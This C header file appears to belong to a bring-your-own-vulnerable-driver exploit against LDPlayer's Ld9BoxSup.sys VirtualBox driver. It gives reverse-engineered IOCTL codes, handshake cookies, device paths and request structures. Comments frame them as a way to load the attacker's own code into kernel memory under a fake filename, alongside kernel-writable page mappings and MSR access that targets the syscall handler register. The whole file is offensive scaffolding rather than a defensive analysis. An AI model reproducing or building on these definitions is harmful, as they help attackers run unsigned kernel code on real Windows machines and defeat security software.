/**
 * @file supdrv_types.h
 * @brief VirtualBox SUPDrv structure definitions for Ld9BoxSup.sys exploitation
 *
 * C port from C++ reference implementation.
 *
 * VERIFIED FROM BINARY ANALYSIS (Dec 2025):
 * All structure sizes and field offsets extracted directly from Ld9BoxSup.sys.
 *
 * CRITICAL: LDPlayer modified VirtualBox IOCTL codes!
 * - Function 2 is QUERY_INFO (LDPlayer added)
 * - LDR_OPEN is function 3 (not 6)
 * - LDR_LOAD is function 4 (not 7)
 * - Initial cookie is 0x69726F74 ("tori") not 0x69726F42 ("Bori")
 */

#ifndef BYOVD_SUPDRV_TYPES_H
#define BYOVD_SUPDRV_TYPES_H

#include "types.h"

//=============================================================================
// Magic Values and Constants
//=============================================================================

#define SUPCOOKIE_MAGIC             "The Magic Word!"
#define SUPCOOKIE_MAGIC_LEN         16

// Initial cookie - LDPlayer modified from VirtualBox's "Bori" to "tori"
// At 0x140008f2d: cmp edx, 0x69726f74
#define SUPCOOKIE_INITIAL_COOKIE    0x69726F74

// Header flags magic value
#define SUPREQHDR_FLAGS_MAGIC       0x42000042
#define SUPREQHDR_FLAGS_DEFAULT     SUPREQHDR_FLAGS_MAGIC
#define SUPREQHDR_FLAGS_EXTRA_IN    0x00000001

//=============================================================================
// IOCTL Codes - VERIFIED from Ld9BoxSup.sys disassembly
//=============================================================================
//
// Formula: ((0x22) << 16) | ((0x02) << 14) | (((func) | 128) << 2) | (0)
//
// CRITICAL: LDPlayer shifted function numbers from standard VBox!
// They inserted QUERY_INFO at function 2, pushing LDR_OPEN to function 3.

#define SUP_IOCTL_COOKIE            0x00228204  // Function 1 (cbIn=0x30, cbOut=0x38)
#define SUP_IOCTL_QUERY_INFO        0x00228208  // Function 2 (LDPlayer added)
#define SUP_IOCTL_LDR_OPEN          0x0022820C  // Function 3 (cbIn=0x148, cbOut=0x28)
#define SUP_IOCTL_LDR_LOAD          0x00228210  // Function 4
#define SUP_IOCTL_LDR_FREE          0x00228214  // Function 5
#define SUP_IOCTL_LDR_GET_SYMBOL    0x00228218  // Function 6
#define SUP_IOCTL_CALL_VMMR0        0x0022821C  // Function 7
#define SUP_IOCTL_LOW_ALLOC         0x00228220  // Function 8
#define SUP_IOCTL_LOW_FREE          0x00228224  // Function 9
#define SUP_IOCTL_PAGE_ALLOC_EX     0x00228228  // Function 10 - dual R3/R0 mapping!
#define SUP_IOCTL_PAGE_MAP_KERNEL   0x0022822C  // Function 11
#define SUP_IOCTL_PAGE_PROTECT      0x00228230  // Function 12
#define SUP_IOCTL_PAGE_FREE         0x00228234  // Function 13
#define SUP_IOCTL_PAGE_LOCK         0x00228238  // Function 14
#define SUP_IOCTL_PAGE_UNLOCK       0x0022823C  // Function 15
#define SUP_IOCTL_CONT_ALLOC        0x00228240  // Function 16
#define SUP_IOCTL_CONT_FREE         0x00228244  // Function 17
#define SUP_IOCTL_MSR_PROBER        0x00228288  // Function 34 - MSR read/write

//=============================================================================
// Known Driver Versions
//=============================================================================
// LDPlayer 9.x uses 0x00320000 (VBox 7.x fork) - from binary disassembly
// At 0x140004787: cmp r8d, 0x320000

#define SUPDRV_VERSION              0x00320000  // LDPlayer 9.x Ld9BoxSup.sys

static const UINT32 KNOWN_VERSIONS[] = {
    0x00320000,  // LDPlayer 9.x - from binary analysis
    0x00290008,  // VBox 6.1.36+
    0x00290007,  // VBox 6.1.x early
    0x00290006,  // VBox 6.1.x
    0x001F0007,  // VBox 6.0.x
    0x001C0007,  // VBox 5.2.x
};
#define KNOWN_VERSIONS_COUNT (sizeof(KNOWN_VERSIONS) / sizeof(KNOWN_VERSIONS[0]))

//=============================================================================
// Device Paths
//=============================================================================

// NT device paths (for use with NtCreateFile) - REQUIRED for this driver
// VirtualBox/LDPlayer drivers do NOT create DosDevices symbolic links!
#define NT_DEVICE_NAME_LDPLAYER      L"\\Device\\Ld9BoxDrv"
#define NT_DEVICE_NAME_LDPLAYER_USER L"\\Device\\Ld9BoxDrvU"
#define NT_DEVICE_NAME_VBOX          L"\\Device\\VBoxDrv"

// DosDevices paths - for detection of existing drivers only
#define DEVICE_NAME_LDPLAYER         L"\\\\.\\Ld9BoxDrv"
#define DEVICE_NAME_LDPLAYER_USER    L"\\\\.\\Ld9BoxDrvU"
#define DEVICE_NAME_VBOX             L"\\\\.\\VBoxDrv"

//=============================================================================
// Structure Definitions
//=============================================================================

#pragma pack(push, 1)

/**
 * Common request header for all SUPDrv IOCTLs
 * Size: 24 bytes
 */
typedef struct _SUPREQHDR {
    UINT32 u32Cookie;           // Cookie from initial handshake
    UINT32 u32SessionCookie;    // Session-specific cookie
    UINT32 cbIn;                // Size of input data
    UINT32 cbOut;               // Size of output data
    UINT32 fFlags;              // Flags (must include SUPREQHDR_FLAGS_MAGIC)
    INT32  rc;                  // VirtualBox status code (VINF_SUCCESS on success)
} SUPREQHDR, *PSUPREQHDR;

// Compile-time size verification
_Static_assert(sizeof(SUPREQHDR) == 24, "SUPREQHDR must be 24 bytes");

//-----------------------------------------------------------------------------
// SUP_IOCTL_COOKIE - Establish session and negotiate version
//-----------------------------------------------------------------------------

typedef struct _SUPCOOKIE_IN {
    char   szMagic[16];         // "The Magic Word!"
    UINT32 u32ReqVersion;       // Version we request
    UINT32 u32MinVersion;       // Minimum version we accept
} SUPCOOKIE_IN, *PSUPCOOKIE_IN;

typedef struct _SUPCOOKIE_OUT {
    UINT32 u32Cookie;           // Returned cookie for subsequent calls
    UINT32 u32SessionCookie;    // Session cookie
    UINT32 u32SessionVersion;   // Driver version
    UINT32 u32DriverVersion;    // Driver revision
    UINT32 cFunctions;          // Number of exported functions
    UINT32 u32Padding;          // Alignment padding for pSession
    UINT64 pSession;            // Session pointer (kernel address)
} SUPCOOKIE_OUT, *PSUPCOOKIE_OUT;

typedef struct _SUPCOOKIE {
    SUPREQHDR Hdr;
    union {
        SUPCOOKIE_IN  In;
        SUPCOOKIE_OUT Out;
    } u;
} SUPCOOKIE, *PSUPCOOKIE;

// Size constants - VERIFIED from binary
#define COOKIE_SIZE_IN  0x30    // 48 bytes
#define COOKIE_SIZE_OUT 0x38    // 56 bytes

_Static_assert(sizeof(SUPCOOKIE_IN) == 24, "SUPCOOKIE_IN must be 24 bytes");
_Static_assert(sizeof(SUPCOOKIE_OUT) == 32, "SUPCOOKIE_OUT must be 32 bytes");

//-----------------------------------------------------------------------------
// SUP_IOCTL_LDR_OPEN - Request kernel memory allocation
//-----------------------------------------------------------------------------

typedef struct _SUPLDROPEN_IN {
    UINT32 cbImageWithTabs;     // Total image size
    UINT32 cbImageBits;         // Image bits size
    char   szName[32];          // Module name
    char   szFilename[260];     // Filename (can be fake)
} SUPLDROPEN_IN, *PSUPLDROPEN_IN;

typedef struct _SUPLDROPEN_OUT {
    void*  pvImageBase;         // RETURNED: Kernel address for our code
    INT32  fNativeLoader;       // True if native OS loader used
    UINT32 u32Padding;          // Alignment padding
} SUPLDROPEN_OUT, *PSUPLDROPEN_OUT;

typedef struct _SUPLDROPEN {
    SUPREQHDR Hdr;
    union {
        SUPLDROPEN_IN  In;
        SUPLDROPEN_OUT Out;
    } u;
    UINT32 u32EndPadding;       // Alignment padding
} SUPLDROPEN, *PSUPLDROPEN;

// Size constants - VERIFIED from binary
#define LDR_OPEN_SIZE_IN  0x148  // 328 bytes
#define LDR_OPEN_SIZE_OUT 0x28   // 40 bytes

_Static_assert(sizeof(SUPLDROPEN_IN) == 300, "SUPLDROPEN_IN must be 300 bytes");
_Static_assert(sizeof(SUPLDROPEN_OUT) == 16, "SUPLDROPEN_OUT must be 16 bytes");
_Static_assert(sizeof(SUPLDROPEN) == 328, "SUPLDROPEN must be 328 bytes");

//-----------------------------------------------------------------------------
// SUP_IOCTL_LDR_LOAD - Load module and execute entry point
//-----------------------------------------------------------------------------

typedef enum _SUPLDRLOADEP {
    SUPLDRLOADEP_NOTHING = 0,
    SUPLDRLOADEP_VMMR0,
    SUPLDRLOADEP_SERVICE
} SUPLDRLOADEP;

typedef struct _SUPLDRLOAD_IN {
    void*       pvImageBase;        // Must match SUP_IOCTL_LDR_OPEN result
    UINT32      cbImageWithTabs;    // Same as SUPLDROPEN
    UINT32      cbImageBits;        // Same as SUPLDROPEN
    UINT32      offSymbols;         // Offset to symbol table (0 if none)
    UINT32      cSymbols;           // Symbol count (0 if none)
    UINT32      offStrTab;          // Offset to string table (0 if none)
    UINT32      cbStrTab;           // String table size (0 if none)
    SUPLDRLOADEP eEPType;           // Entry point type
    void*       pfnModuleInit;      // Called after load
    void*       pfnModuleTerm;      // Called on unload
    void*       pvVMMR0;            // VM handle
    void*       pvVMMR0EntryFast;   // Fast entry point
    void*       pvVMMR0EntryEx;     // Extended entry point
    UINT8       abImage[1];         // Image data follows
} SUPLDRLOAD_IN, *PSUPLDRLOAD_IN;

typedef struct _SUPLDRLOAD_OUT {
    INT32 rc;                       // Return code
} SUPLDRLOAD_OUT, *PSUPLDRLOAD_OUT;

typedef struct _SUPLDRLOAD {
    SUPREQHDR Hdr;
    union {
        SUPLDRLOAD_IN  In;
        SUPLDRLOAD_OUT Out;
    } u;
} SUPLDRLOAD, *PSUPLDRLOAD;

// Size calculation macro
#define SUPLDRLOAD_BASE_SIZE (sizeof(SUPREQHDR) + offsetof(SUPLDRLOAD_IN, abImage))
#define SUP_IOCTL_LDR_LOAD_SIZE_IN(cbImage) (SUPLDRLOAD_BASE_SIZE + (cbImage))
#define SUP_IOCTL_LDR_LOAD_SIZE_OUT (sizeof(SUPREQHDR) + sizeof(INT32))

//-----------------------------------------------------------------------------
// SUP_IOCTL_PAGE_ALLOC_EX - Allocate pages with dual R3/R0 mappings
//-----------------------------------------------------------------------------

typedef struct _SUPPAGEALLOCEX_IN {
    UINT32 cPages;              // Number of 4KB pages
    UINT8  fKernelMapping;      // Map into kernel space (pvR0)
    UINT8  fUserMapping;        // Map into user space (pvR3)
    UINT8  fReserved0;
    UINT8  fReserved1;
} SUPPAGEALLOCEX_IN, *PSUPPAGEALLOCEX_IN;

typedef struct _SUPPAGEALLOCEX_OUT {
    UINT64 pvR3;                // Ring-3 mapping address (usermode writable)
    UINT64 pvR0;                // Ring-0 mapping address (kernel executable)
    // Physical page addresses follow: aPages[cPages]
} SUPPAGEALLOCEX_OUT, *PSUPPAGEALLOCEX_OUT;

typedef struct _SUPPAGEALLOCEX {
    SUPREQHDR Hdr;
    union {
        SUPPAGEALLOCEX_IN  In;
        SUPPAGEALLOCEX_OUT Out;
    } u;
} SUPPAGEALLOCEX, *PSUPPAGEALLOCEX;

// Size calculations
#define SUP_IOCTL_PAGE_ALLOC_EX_SIZE_IN (sizeof(SUPREQHDR) + 8)
#define SUP_IOCTL_PAGE_ALLOC_EX_SIZE_OUT(cPages) (sizeof(SUPREQHDR) + 16 + ((cPages) * 8))

//-----------------------------------------------------------------------------
// SUP_IOCTL_PAGE_FREE - Free pages allocated by PAGE_ALLOC_EX
//-----------------------------------------------------------------------------

typedef struct _SUPPAGEFREE_IN {
    UINT64 pvR3;                // R3 address returned by PAGE_ALLOC_EX
} SUPPAGEFREE_IN, *PSUPPAGEFREE_IN;

typedef struct _SUPPAGEFREE {
    SUPREQHDR Hdr;
    union {
        SUPPAGEFREE_IN In;
    } u;
} SUPPAGEFREE, *PSUPPAGEFREE;

#define SUP_IOCTL_PAGE_FREE_SIZE_IN (sizeof(SUPREQHDR) + 8)
#define SUP_IOCTL_PAGE_FREE_SIZE_OUT (sizeof(SUPREQHDR))

//-----------------------------------------------------------------------------
// SUP_IOCTL_MSR_PROBER - Read/write Model Specific Registers
//-----------------------------------------------------------------------------

typedef enum _SUPMSRPROBEROP {
    SUPMSRPROBEROP_INVALID = 0,
    SUPMSRPROBEROP_READ,
    SUPMSRPROBEROP_WRITE,
    SUPMSRPROBEROP_MODIFY,
    SUPMSRPROBEROP_MODIFY_FASTER,
    SUPMSRPROBEROP_END,
    SUPMSRPROBEROP_32BIT_HACK = 0x7FFFFFFF
} SUPMSRPROBEROP;

typedef struct _SUPMSRPROBER_IN {
    SUPMSRPROBEROP enmOp;       // Operation type
    UINT32 uMsr;                // MSR number
    UINT32 idCpu;               // Target CPU (UINT32_MAX = any)
    UINT32 u32Padding;
    union {
        struct {
            UINT64 uToWrite;    // Value to write
        } Write;
        struct {
            UINT64 fAndMask;    // AND mask
            UINT64 fOrMask;     // OR mask
        } Modify;
        UINT64 auPadding[3];
    } uArgs;
} SUPMSRPROBER_IN, *PSUPMSRPROBER_IN;

typedef struct _SUPMSRPROBER_OUT {
    union {
        struct {
            UINT64 uValue;      // Read value
            UINT8  fGp;         // True if #GP during read
            UINT8  abPadding[7];
        } Read;
        struct {
            UINT8  fGp;         // True if #GP during write
            UINT8  abPadding[15];
        } Write;
        UINT64 auPadding[5];
    } uResults;
} SUPMSRPROBER_OUT, *PSUPMSRPROBER_OUT;

typedef struct _SUPMSRPROBER {
    SUPREQHDR Hdr;
    union {
        SUPMSRPROBER_IN  In;
        SUPMSRPROBER_OUT Out;
    } u;
} SUPMSRPROBER, *PSUPMSRPROBER;

// Key MSR numbers
#define MSR_IA32_LSTAR  0xC0000082  // Syscall handler address (64-bit)
#define MSR_IA32_STAR   0xC0000081  // Syscall segment selectors
#define MSR_IA32_FMASK  0xC0000084  // Syscall RFLAGS mask

#pragma pack(pop)

//=============================================================================
// Helper Functions
//=============================================================================

static inline bool IsKernelAddress(void* addr) {
    return (UINT64)addr >= 0xFFFF800000000000ULL;
}

#endif // BYOVD_SUPDRV_TYPES_H
